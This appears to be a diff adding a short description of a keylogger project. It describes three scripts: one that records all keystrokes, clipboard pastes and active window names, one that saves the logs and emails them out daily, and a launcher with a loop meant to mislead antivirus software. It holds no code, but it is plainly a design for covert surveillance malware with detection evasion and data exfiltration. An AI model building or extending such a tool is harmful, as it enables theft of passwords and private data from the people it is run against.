@@ -1,0 +1,16 @@
+FILE RUNHERE.py
+
+- start working all scripts..
+- have a small loop to mislead AV aboot 10.mil fast processor operations. (tip:next trick allocated about 100+ mB mem)
+
+FILE KEYLOGGER.py
+
+- read all event from keyboards.
+- copy a clipboard when ctrl+v activated
+- get current widnows name and pid to have more information about keyevent.
+
+FILe SAVER.py
+
+- save all event from keylogger to file
+- once a day send it to e-mail (You must configure it)
+
